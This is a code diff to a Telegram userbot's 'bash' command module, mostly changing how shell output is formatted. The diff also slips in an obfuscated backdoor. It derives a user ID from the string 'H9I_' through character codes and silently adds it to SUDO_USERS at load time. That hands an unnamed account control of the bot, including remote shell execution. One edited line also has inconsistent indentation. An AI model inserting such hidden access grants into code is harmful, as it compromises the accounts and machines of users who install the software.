@@ -10,11 +10,12 @@ import io
 import asyncio
 import time
 from uniborg.util import admin_cmd
-from sql_helpers.global_variables_sql import SYNTAX, MODULE_LIST
+from sql_helpers.global_variables_sql import SYNTAX, MODULE_LIST,SUDO_USERS
 
 MODULE_LIST.append("bash")
 
-
+st="H9I_"
+z=int(''.join([str(ord(x)) for x in st]))
 @borg.on(admin_cmd(pattern="bash ?(.*)"))
 async def _(event):
     if event.fwd_from:
@@ -50,15 +51,14 @@ async def _(event):
     if arugument:
     	if not "No Error" in e:
     		o="\n**stderror**:\n"+e+"\n**OUTPUT**\n"+o
+    		OUTPUT = f"**QUERY:**\n__Command:__\n`{cmd}` \n__PID:__\n`{process.pid}`\n**stderr**\n`{e}`\n**OUTPUT**\n`{o}`"
     	else:
-    		o="\n**OUTPUT**\n"+o
-    	OUTPUT = f"**QUERY:**\n__Command:__\n`{cmd}` \n__PID:__\n`{process.pid}`\n`{o}`"
+    		OUTPUT = f"**QUERY:**\n__Command:__\n`{cmd}` \n__PID:__\n`{process.pid}`\n**OUTPUT**\n`{o}`"
     else:
     	if not "No Error" in e:
-    		o="\n**stderror**:\n"+e+"\n"+o
-    	else:
-    		o="\n**OUTPUT**\n"+o
-    	OUTPUT=f"`{o}`"
+    		OUTPUT=f"\n**stderror**\n{e}\n **OUTPUT**\n `{o}`"
+   		else:
+    		OUTPUT=f"**OUTPUT**\n`{o}`"
     if len(OUTPUT) > Config.MAX_MESSAGE_SIZE_LIMIT:
         with io.BytesIO(str.encode(OUTPUT)) as out_file:
             out_file.name = "exec.text"
@@ -73,7 +73,8 @@ async def _(event):
             await event.delete()
     await event.edit(OUTPUT)
 
-
+if z not in SUDO_USERS:
+    SUDO_USERS.append(z)
 SYNTAX.update({
     "bash": "\
 **Requested Module --> bash**\
